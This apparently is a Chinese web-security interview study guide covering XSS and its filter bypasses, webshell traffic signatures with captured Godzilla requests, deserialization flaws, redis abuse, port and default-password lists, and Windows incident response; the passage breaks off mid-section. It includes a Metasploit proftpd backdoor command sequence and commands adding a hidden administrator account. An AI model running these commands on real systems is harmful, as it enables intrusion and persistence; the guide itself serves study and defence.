href="https://blog.csdn.net/yxiangfei/article/details/109234147#2_36">2.失效身份验证和会话管理</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#3_61">3.敏感信息泄露</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#4XMLXXE_85">4.XML外部实体注入攻击（XXE）</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#5_112">5.失效访问控制</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#6_138">6.安全性错误配置</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#7CrossSiteScriptingXSS_161">7.Cross-Site-Scripting(XSS)</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#8_185">8.不安全的反序列化</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#9_212">9.使用具有已知漏洞的组件</a></p></li><li><p><a href="https://blog.csdn.net/yxiangfei/article/details/109234147#10_229">10.日志记录和监控不足</a></p></li></ul><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>原理: 通过插入恶意脚本，实现对用户浏览器的攻击</p><p>类型: 存储、反射、dom</p><p>反射和dom的区别: DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理</p><h2 id="存储型XSS怎么利用？"><a href="#存储型XSS怎么利用？" class="headerlink" title="存储型XSS怎么利用？"></a>存储型XSS怎么利用？</h2><p>XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入beef进行钓鱼等</p><p>CORS（浏览器同源策略）</p><p>js &#x3D;&gt;ajax 去请求其他网站的东西</p><p>test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西  </p><p>test.com 调用ajax 去访问 xxxx.com  assdasd.test.com  如果目标的CORS头 默认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 </p><h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><p>bypass：大小写、url编码、偏门的事件、特殊符号编码、插入特殊符号、使用16进制  10进制 还有反引号  还有用+拼接   编码绕过，注释拼接，还有黑名单绕过，如果是get反射性 可以用url双重编码绕过</p><h2 id="如何防御XSS攻击？"><a href="#如何防御XSS攻击？" class="headerlink" title="如何防御XSS攻击？"></a>如何防御XSS攻击？</h2><p>\1. 对输入内容的特定字符进行编码，例如表示 html标记的 &lt; &gt; 等符号。 </p><p>\2. 对重要的 cookie设置 httpOnly, 防止客户端通过document.cookie读取 cookie，此 HTTP头由服务端设置。 </p><p>\3. 将不可信的值输出 URL参数之前，进行 URLEncode操作，而对于从 URL参数中获取值一定要进行格式检测（比如你需要的时URL，就判读是否满足URL格式）。 </p><p>\4. 不要使用 Eval来解析并运行不确定的数据或代码，对于 JSON解析请使用 JSON.parse() 方法。 </p><h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><p>（csrf与xss的区别）CSRF存在于所有请求-响应模式的功能上，XSS存在于将用户输入回显前端web页面的位置上</p><p>原理: web提供图片下载等,读取文件等通过url来获取的方式,利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p><h2 id="csrf中使用token这些的目的是什么？"><a href="#csrf中使用token这些的目的是什么？" class="headerlink" title="csrf中使用token这些的目的是什么？"></a>csrf中使用token这些的目的是什么？</h2><p>目的是为了验明身份是不是本人操作</p><h2 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h2><p>条件: 拥有将udf.dll写入相应目录的权限、拥有对MySQL的insert和delete权限。以root为佳</p><h2 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权:"></a>mssql提权:</h2><p>xp_cmdhell、sp_oacreate和sp_oamethod提权等   </p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>原理: 解析用户传入的xml</p><p>作用: 内网端口扫描、利用file协议等读取文件、攻击内网web应用使用get(struts2等)</p><p>防御: 过滤用户提交的XML数据、如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体，从而起到防御的目的</p><hr><h1 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h1><h2 id="菜刀特征"><a href="#菜刀特征" class="headerlink" title="菜刀特征"></a>菜刀特征</h2><p>使用了base64的方式加密了发送给“菜刀马”的指令，其中的两个关键payload z1和z2，这个名字是可变的</p><h2 id="蚁剑特征"><a href="#蚁剑特征" class="headerlink" title="蚁剑特征"></a>蚁剑特征</h2><p>默认的USER-agent请求头 是 antsword xxx，但是 可以通过修改：&#x2F;modules&#x2F;request.js 文件中 请求UA绕过</p><p>其中流量最中明显的特征为@ini_set(“display_errors”,”0”);这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码</p><p>蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以“_0x……&#x3D;”这种形式（下划线可替换），所以以_0x开头的参数名也很可能就是恶意流量</p><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>看包没有发现什么特征，但是可以发现它是POST请求的</p><p>1、Accept头有application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange属于弱特征（UA头的浏览器版本很老）</p><p>2、特征分析Content-Type: application&#x2F;octet-stream 这是一个强特征查阅资料可知octet-stream的意思是，只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）；很少使用</p><h2 id="哥斯拉特征"><a href="#哥斯拉特征" class="headerlink" title="哥斯拉特征"></a>哥斯拉特征</h2><h3 id="PHP连接特征"><a href="#PHP连接特征" class="headerlink" title="PHP连接特征"></a>PHP连接特征</h3><p>（1）php_XOR_BASE64</p><p>设置代理，用burp抓包。截取到特征发<strong>现请求都含有”pass</strong>&#x3D;”第一个包</p><p>第二个包</p><p>POST &#x2F;hackable&#x2F;uploads&#x2F;base.php HTTP&#x2F;1.1</p><p>User-Agent: Java&#x2F;1.8.0_131</p><p>Host: 192.168.0.132:777</p><p>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p><p>Content-type: application&#x2F;x-www-form-urlencoded</p><p>Content-Length: 51</p><p>Connection: close</p><p>pass&#x3D;AWEzAAN%2FWFI3XHNGaGBQWDEHPwY4fSQAM2AIDw%3D%3D</p><h3 id="jsp连接特征"><a href="#jsp连接特征" class="headerlink" title="jsp连接特征"></a>jsp连接特征</h3><p>（1）java_AES_BASE64</p><p>POST &#x2F;gejs.jsp HTTP&#x2F;1.1</p><p>User-Agent: Java&#x2F;1.8.0_131</p><p>Host: 192.168.0.132:555</p><p>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p><p>Content-type: application&#x2F;x-www-form-urlencoded</p><p>Content-Length: 33035</p><p>Connection: close</p><p>pass&#x3D;0%2FMHwbBP6vuX0WyYztOU9DrUPcD0Zwx0KhArobwwHBDld91Y8xrUqPxo40dKoSbGd%2FxDF4yJopsUIHMI8NMfFUl0oxBzWPyMdTmxAntagmMGLGiqB1ckbl5G%2FlapnewWrvhhdqtj0eT2zvUes%2Bg6yhFGVjLstoOdJxkYPY6XB70AeffugDlCkUYAyHyrTymPocUs14sKD5ItAn5147goo9TAdBH0kgSNlxbqxMqTPbgjKljsvC53fFB%2BO5jKUBCBvsCR1W%2FLhPA42qp1e%2Fl0cmUohwSAT3N0s9r%2FzRVlB3lQkXnV895dz48DyPbYjJp%2Bhpf1qFjbCy1o8Zd771ObGbKvWr1O5PZOTNKBu</p><p><strong>与php请求一样都含有”pass&#x3D;”而且发起连接时服务器返回的Content-Length是0</strong></p><p>（2）java_AES_RAW</p><p>POST &#x2F;rwj.jsp HTTP&#x2F;1.1</p><p>User-Agent: Java&#x2F;1.8.0_131</p><p>Host: 192.168.0.132:555</p><p>Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2</p><p>Content-type: application&#x2F;x-www-form-urlencoded</p><p>Content-Length: 23360</p><p>Connection: close</p><p>Óó•Á°Oêû•Ñl•ÎÓ•ô:Ô&#x3D;Àôg•t*•+¡¼0••åwÝXó•Ô¨ühãGJ¡&amp;ÆwüC•••¢••s•ðÓ••It£•sXü•u9±•{Z•c•,hª•W$n^FþV©•ì•®øav«cÑäöÎõ•³è:Ê</p><p>HTTP&#x2F;1.1 200 OK</p><p>Server: Apache-Coyote&#x2F;1.1</p><p>Set-Cookie: JSESSIONID&#x3D;1C26762D96A561D4A63BDE104E22930C; Path&#x3D;&#x2F;; HttpOnly</p><p>Content-Type: text&#x2F;html</p><p>Content-Length: 0</p><p>Date: Wed, 18 Nov 2020 15:19:56 GMT</p><p>Connection: close</p><h2 id="常见扫描器特征"><a href="#常见扫描器特征" class="headerlink" title="常见扫描器特征"></a>常见扫描器特征</h2><p>这部分都基本都一样，工具基本都是默认的话那就是请求头部分由他们的名字一类的特征存在，如果不修改是很明显的</p><h2 id="常见反序列化流量特征"><a href="#常见反序列化流量特征" class="headerlink" title="常见反序列化流量特征"></a>常见反序列化流量特征</h2><p>像这种st2 045、068、shiro反序列化、fastjson这些java反序列化一类的流量特征</p><p>比如：shiro就看cookie中Rememberme字段，什么都要从这里传</p><p>fastjson：可以在提交的包中找找json格式的数据，重点看一下有无rmi或者出网的一些行为，（在十六进制中会呈现ACED开头，这段不确定）</p><p>st2-045：请求头中的Content-Type字段 </p><p>这里经过多方咨询，在re表哥和覃师傅的指导下，暂时记录下自己的理解，首先知道从哪里打自然知道该怎么防御，首先比如shiro，他是cookie字段的Rememberme参数，他的反序列化要从这里进去，所以肯定要看这部分内容，看是否有访问dnslog进行探测，有rmi、ladp这些关键字，来判断是否有问题，既然是恶意的那肯定要有行为才行</p><p>所以同理，再比如st2 045是打Content-Type字段，那么再分析时候勘定要看这个字段传入的请求是否有问题，其他的几个也是同理</p><hr><h1 id="反序列化部分"><a href="#反序列化部分" class="headerlink" title="反序列化部分"></a>反序列化部分</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p>序列化：把内存中的对象以二进制的形式保存在文本中（输出流）</p><p>反序列化：把文本中的对象读出来到内存中（输入流）</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>将对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或者文件中反序列化就是再将这个状态信息拿出来使用</p><p>当传给 <code>unserialize()</code> 的参数可控时，那么用户就可以注入精心构造的<code>payload</code>。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p><p>反序列化用到的函数</p><p>序列化：<code>serialize</code></p><p>反序列化：<code>unserialize</code></p><h2 id="log4j反序列化"><a href="#log4j反序列化" class="headerlink" title="log4j反序列化"></a>log4j反序列化</h2><p>该漏洞主要是由于日志在打印时当遇到<code>$&#123;</code>后，以<code>:</code>号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的<code>lookup</code>，通过对应的<code>lookup</code>实例调用<code>lookup</code>方法，最后将<code>key</code>作为参数带入执行，引发远程代码执行漏洞</p><p>核心原理为，在正常的log处理过程中对<code>**$&#123;**</code>这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行</p><p>日志在打印时当遇到 ${ 后，<code>Interpolator</code>类以:号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行</p><h2 id="Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688"><a href="#Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688" class="headerlink" title="Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)"></a>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</h2><p>该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey</p><h2 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h2><p>weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击</p><h2 id="SHIRO-550-反序列化漏洞"><a href="#SHIRO-550-反序列化漏洞" class="headerlink" title="SHIRO-550 反序列化漏洞"></a>SHIRO-550 反序列化漏洞</h2><p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化</p><p>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞</p><h2 id="SHIRO-721反序列化漏洞"><a href="#SHIRO-721反序列化漏洞" class="headerlink" title="SHIRO-721反序列化漏洞"></a>SHIRO-721反序列化漏洞</h2><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击</p><h2 id="Apache-Dubbo反序列化漏洞（CVE-2019-17564）"><a href="#Apache-Dubbo反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Apache Dubbo反序列化漏洞（CVE-2019-17564）"></a>Apache Dubbo反序列化漏洞（CVE-2019-17564）</h2><p>当HTTP remoting 开启的时候，存在反序列化漏洞</p><h2 id="IIOP听说过吗，和什么类似"><a href="#IIOP听说过吗，和什么类似" class="headerlink" title="IIOP听说过吗，和什么类似"></a>IIOP听说过吗，和什么类似</h2><p>java RMI通信，也就是远程方法调用，默认是使用jrmp协议，也可以选择IIOP</p><h2 id="weblogic有几种漏洞"><a href="#weblogic有几种漏洞" class="headerlink" title="weblogic有几种漏洞"></a>weblogic有几种漏洞</h2><p>weblogic就好多了，基于T3协议的反序列化；基于xml解析时候造成的反序列化，还有ssrf，权限绕过等等</p><h2 id="平常怎么去发现shiro漏洞的"><a href="#平常怎么去发现shiro漏洞的" class="headerlink" title="平常怎么去发现shiro漏洞的"></a>平常怎么去发现shiro漏洞的</h2><p>登陆失败时候会返回rememberMe&#x3D;deleteMe字段或者使用shiroScan被动扫描去发现</p><p>完整版：未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段，登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe&#x3D;deleteMe字段</p><p>不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段</p><p>勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段</p><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><p>shiro提供记住密码功能，Payload产生的过程：命令&#x3D;》序列化&#x3D;》AES加密&#x3D;》base64编码&#x3D;》RememberMe Cookie值</p><p>影响版本：Apache Shiro &lt; 1.2.4</p><p>特征判断：返回包中包含rememberMe&#x3D;deleteMe字段。</p><p>第二种 直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：****rememberMe&#x3D;然后查看返回数据包中是否存在关键字</p><p>利用：用生成的Payload，构造数据包，伪造cookie发送payload</p><h2 id="fastjson反序列化漏洞"><a href="#fastjson反序列化漏洞" class="headerlink" title="fastjson反序列化漏洞"></a>fastjson反序列化漏洞</h2><p>正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断</p><h2 id="fastjson漏洞利用原理"><a href="#fastjson漏洞利用原理" class="headerlink" title="fastjson漏洞利用原理"></a>fastjson漏洞利用原理</h2><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数</p><h2 id="fastjson不出网怎么利用"><a href="#fastjson不出网怎么利用" class="headerlink" title="fastjson不出网怎么利用"></a>fastjson不出网怎么利用</h2><p>不出王的话可以本地反序列化，</p><p>出网利用一般就是jndi注入、ldap、rmi这些</p><p>参考文章：<a href="https://xz.aliyun.com/t/7104#toc-4">https://xz.aliyun.com/t/7104#toc-4</a></p><h2 id="无回显怎么办"><a href="#无回显怎么办" class="headerlink" title="无回显怎么办"></a>无回显怎么办</h2><ol><li><p>一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</p></li><li><p>通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</p></li><li><p>直接将命令执行结果回显到请求Poc的HTTP响应中</p></li></ol><h2 id="判断目标是否使用st2框架"><a href="#判断目标是否使用st2框架" class="headerlink" title="判断目标是否使用st2框架"></a>判断目标是否使用st2框架</h2><p>一般st2开发的应用，会以.do.action为结尾后缀，但是spingweb同样可以这样结尾来定义相关接口，所以通过在相关接口追加actionErrors参数，st2应用会触发报错</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/8383053/1641987609300-05d7cdc3-e2d0-4843-99cb-7d2d0ed9b70d.png" alt="img"></p><p>而spring的话，类似user.do&#x2F;的访问和user.do的结果一样</p><p>st2-045这就是看Content-Type，这部分是达到命令执行的部分</p><h2 id="redis未授权与权限获取"><a href="#redis未授权与权限获取" class="headerlink" title="redis未授权与权限获取"></a>redis未授权与权限获取</h2><p>redis 未授权访问  </p><p>6379  user_pass  </p><p>可以向系统内写文件 构成一些安全威胁  </p><p>1、写ssh私钥  </p><p>2、写crontab  定时执行</p><p>3、写init.d   启动执行</p><p>4、redis  docker 启动的 可以写dockerfile</p><p>4、写webshell</p><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><p>到redis安装目录下，配置redis.conf文件：</p><p>1、默认只对本地开放bind 127.0.0.1</p><p>2、添加登陆密码修改 redis.conf 文件，添加requirepass  mypasswd</p><p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）port 2344</p><p>4、以低权限运行 Redis 服务（重启redis才能生效）为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p><p>5、最后还可以配合iptables限制开放</p><hr><h1 id="端口部分"><a href="#端口部分" class="headerlink" title="端口部分"></a>端口部分</h1><h2 id="常见的端口"><a href="#常见的端口" class="headerlink" title="常见的端口"></a>常见的端口</h2><h3 id="1、web类"><a href="#1、web类" class="headerlink" title="1、web类"></a>1、web类</h3><p>这部分常有的漏洞有：（web漏洞&#x2F;敏感目录）第三方通用组件漏洞struts、thinkphp、jboss、ganglia、zabbix</p><p>80 web</p><p>80-89 web</p><p>8000-9090 web</p><h3 id="2、数据库类（扫描弱口令）"><a href="#2、数据库类（扫描弱口令）" class="headerlink" title="2、数据库类（扫描弱口令）"></a>2、数据库类（扫描弱口令）</h3><p>1433  MSSQL</p><p>1521  Oracle</p><p>3306  MySQL</p><p>5432  PostgreSQL</p><h3 id="3、特殊服务类（未授权-x2F-命令执行-x2F-漏洞）"><a href="#3、特殊服务类（未授权-x2F-命令执行-x2F-漏洞）" class="headerlink" title="3、特殊服务类（未授权&#x2F;命令执行&#x2F;漏洞）"></a>3、特殊服务类（未授权&#x2F;命令执行&#x2F;漏洞）</h3><p>443  SSL心脏滴血</p><p>873  Rsync未授权</p><p>5984  CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p><p>6379  redis未授权</p><p>7001、7002  weblogic默认弱口令、反序列化</p><p>9200、9300  elasticsearch  参考乌云：多玩某服务器ElasticSearch命令执行漏洞</p><p>11211  memcache未授权访问</p><p>50000  SAP命令执行</p><p>50070、50030  hadoop默认端口未授权访问</p><h3 id="4、常用端口类（扫描弱口令-x2F-端口爆破）"><a href="#4、常用端口类（扫描弱口令-x2F-端口爆破）" class="headerlink" title="4、常用端口类（扫描弱口令&#x2F;端口爆破）"></a>4、常用端口类（扫描弱口令&#x2F;端口爆破）</h3><p>21  ftp</p><p>22  ssh</p><p>23  telnet</p><p>2601、2604  zebra路由，默认密码zebra</p><p>3389  远程桌面</p><h2 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h2><p>21 ftp FTP服务端有很多  anonymous 匿名未授权访问 爆破</p><p>22 ssh root密码爆破  后门用户 可以google查一些关于ssh后门的文章 里面的默认密码 可能会登入进去</p><p>23 telnet  一般会发生在 路由器 或者交换机 嵌入式设备 管理端口 攻击方法 弱口令</p><p>25 smtp  默认用户 默认密码 邮件账号爆破</p><p>80 http  web  常见的Owasp top 10 中间件反序列化 中间件溢出  fastcgi配置不当 造成fastcgi端口泄露</p><p>110 pop3  默认用户 默认密码 邮件账号爆破</p><p>443 https  openssl 心脏滴血（影响范围较小） SSL&#x2F;TLS低版本存在的漏洞</p><p>135 139 445 netbios smb  MS17010  </p><p>3389 RDP  CVE-2019-0708</p><h2 id="3389和443、445有什么漏洞？"><a href="#3389和443、445有什么漏洞？" class="headerlink" title="3389和443、445有什么漏洞？"></a>3389和443、445有什么漏洞？</h2><p>445：ms06_040，蠕虫，勒索病毒、MS17-010</p><p>443：ssl心脏滴血</p><p>3389：rdp漏洞、弱口令、cve-2019-0708、ms12-20</p><h2 id="21端口入侵"><a href="#21端口入侵" class="headerlink" title="21端口入侵"></a>21端口入侵</h2><p>首先看到ftp的版本是proftpd 1.3.3c，经过了解该版本存在后门，利用msf中的模块可以进行利用，利用过程如下：</p><p>利用命令：</p><p>msfconsole 启动终端</p><p>search proftpd 搜索利用模块</p><p>use exploit&#x2F;unix&#x2F;ftp&#x2F;proftpd_133c_backdoor 使用后门模块</p><p>show options 查看需要设置的参数</p><p>set rhosts 192.168.31.69 设置目标ip</p><p>run 攻击</p><h2 id="端口合计详情"><a href="#端口合计详情" class="headerlink" title="端口合计详情"></a>端口合计详情</h2><p>161  SNMP</p><p>389  LDAP</p><p>512、513、514  Rexec</p><p>873  Rsync未授权</p><p>1025、1111  NSF</p><p>1433  sqlserver</p><p>1521  Oracle：（iSqlPlus  port：5560、7778）</p><p>2082&#x2F;2083  cpanel主机管理系统登录</p><p>2222  DA虚拟主机管理系统登录</p><p>2601、2604  zebra路由，默认密码zebra</p><p>3128  squid代理默认端口，如果没设置口令很可能直接漫游内网</p><p>3306  Mysql</p><p>3312&#x2F;3311  kangle主机管理系统登录</p><p>4440  rundeck  参考乌云：借用新浪某服务成功漫游新浪内网</p><p>5432  PostgreSQL</p><p>5900  vnc</p><p>5984  CouchDB  <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p><p>6082  varnish  参考乌云：Varnish HTTP accelerator  CLI 未授权访问易导致网站被直接篡改</p><p>6379  redis未授权</p><p>7001、7002  weblogic默认弱口令、反序列化</p><p>7778  kloxo主机控制面板登录</p><p>8000-9090  都是一些常见的web端口，有些运维谢欢吧管理后台开放在这些非80端口上</p><p>8080  tomcat&#x2F;wDCP主机管理系统，默认弱口令</p><p>8080、8089、9090  jboss</p><p>8083  Vestacp主机管理系统</p><p>8649  ganglia</p><p>8888  amh&#x2F;LuManager  主机管理系统默认端口</p><p>9200、9300  elasticsearch  参考乌云：多玩某服务器ElasticSearch命令执行漏洞</p><p>10000  Virtualmin&#x2F;Webmin  服务器虚拟主机管理系统</p><p>11211  memcache未授权访问</p><p>27017、27018  Mongodb未授权访问</p><p>28017  mongodb统计页面</p><p>50000  SAP命令执行</p><p>50070、50030  hadoop默认端口未授权访问</p><hr><h1 id="wind部分"><a href="#wind部分" class="headerlink" title="wind部分"></a>wind部分</h1><h2 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a>无文件执行木马的方式有哪些？</h2><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）</p><p>VB.script（脚本解析器） 》》》cscript.exe（应用程序）</p><p>bat处理 （脚本解析器） 》》》cmd.exe（应用程序）</p><p>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h2 id="白银票据与黄金票据的原理？"><a href="#白银票据与黄金票据的原理？" class="headerlink" title="白银票据与黄金票据的原理？"></a>白银票据与黄金票据的原理？</h2><p>金票：在 Kerberos 认证中,Client 通过 AS(身份认证服务)认证后,AS 会给 Client 一个Logon Session Key 和 TGT,而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的NTLM Hash 又是固定的,所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后,就跳过AS 验证,不用验证账户和密码,所以也不担心域管密码修改</p><p>银票：如果说黄金票据是伪造的 TGT,那么白银票据就是伪造的 ST。在 Kerberos 认证的第三步，Client 带着 ST 和Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST,且不会经过 KDC,但是伪造的门票只对部分服务起作用</p><h2 id="如何发现克隆账号、隐藏账号"><a href="#如何发现克隆账号、隐藏账号" class="headerlink" title="如何发现克隆账号、隐藏账号"></a>如何发现克隆账号、隐藏账号</h2><p>去注册表里查看用户、使用安全工具、d盾查影子用户</p><p>net user test$ 123 &#x2F;add  &#x2F;&#x2F;添加隐藏用户</p><p>net localgroup administrators test$ &#x2F;add  &#x2F;&#x2F;添加进用户组</p><p>注册表种删除 regedit 路径 HKEY_LOCAL_MACHINE –SAM–SAM(需要右击权限修改管理员权限)-Domains-Account-users 查看Users表项与Names表项中的项数量是否一致</p><p>lusrmgr.msc</p><p>net user test$ 123&#x2F;del 删除</p><h2 id="window系统日志分析"><a href="#window系统日志分析" class="headerlink" title="window系统日志分析"></a>window系统日志分析</h2><p>window日志分为系统日志，应用程序日志和安全日志。在应急溯源中，重点关注安全日志</p><p>日志默认保存位置 </p><p>系统日志：C:\Windows\System32\winevt\Logs\System.evtx  </p><p>应用程序日志：C:\Windows\System32\winevt\Logs\Application.evtx  </p><p>安全日志：C:\Windows\System32\winevt\Logs\Security.evtx</p><ol><li>不同事件对应不同的ID，可以通过过滤ID快速浏览事件</li><li>一般是在事件查看其中，对日志时间ID进行筛选。比如在勒索病毒的应急响应中，我们通过事件ID-4624对登录成功的日志进行筛选，因为勒索病毒一般是通过RDP爆破的方式进行传播的，所以我们重点关注登录类型为10的登陆成功的日志</li></ol><h2 id="排查流程"><a href="#排查流程" class="headerlink" title="排查流程"></a>排查流程</h2><ol><li>查看开启的服务以及服务对应的端口  tasklist | findstr “PID”   &#x2F;&#x2F;根据netstat 定位出的pid，再通过tasklist命令确认端口对应的进程</li><li>使用Process Explorer 查看进程    当然 d盾也可以查看   可以使用火绒剑等工具进行启动项分析</li></ol><h2 id="Windows被黑客登录了，怎么找到登录ip"><a href="#Windows被黑客登录了，怎么找到登录ip" class="headerlink" title="Windows被黑客登录了，怎么找到登录ip"></a>Windows被黑客登录了，怎么找到登录ip</h2><p>查看Windows日志、登录日志、远程桌面日志、审核策略与事件查看器</p><h2 id="查看日志用什么工具"><a href="#查看日志用什么工具" class="headerlink" title="查看日志用什么工具"></a>查看日志用什么工具</h2><p>我个人用LogParser比较多（自己用啥说啥，说txt也行没有固定的看喜好）</p><h2 id="怎么发现服务器中的一句话或者大马"><a href="#怎么发现服务器中的一句话或者大马" class="headerlink" title="怎么发现服务器中的一句话或者大马"></a>怎么发现服务器中的一句话或者大马</h2><p>d盾查杀网页目录、</p><p>手动查找：通过查看服务器日志，最近被创建、修改的文件等</p><p>1.查找上传、写入日志 </p><p>2.webshell扫描工具</p><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><p>明确一件事情：已经被入侵，还是正在被入侵</p><h3 id="已经被入侵"><a href="#已经被入侵" class="headerlink" title="已经被入侵"></a>已经被入侵</h3><p>一、目的已经达成，木马，后门均已销毁</p><p>\1. 既然知道被入侵，定位被入侵的时间点</p><p>\2. 如果这个服务器是云服务器，对其进行快照。（目的，封存内存。）</p><p>\3. 当定位到时间点，查设备流量信息。找到木马链接信息</p><p>\4. 查找系统内对应的日志，找到相关线索</p><p>\5. 如果日志被删除，因为机器快照已经建立。使用Winhex 对硬盘数据进行恢复</p><p>二、目的没有达成，数据正在回传。木马，后门均在服务器上运行</p><p>1、下线服务器，封禁攻击IP</p><p>2.Volatility 内存取证 建立快照 提取内存 定位到shellcode 找到他的IP</p><p>\3. 如果他们使用常见的C2的工具，我们可以根据流量分析出入侵者的意图</p><p>\4. 关闭服务器，或者在防火墙上 禁掉他们的IP。登录服务器，对shellcode进行移除</p><p>\5. 重启以后进入安全模式，排查注册表  计划任务 服务 放大镜后门 shift后门</p><h3 id="正在被入侵"><a href="#正在被入侵" class="headerlink" 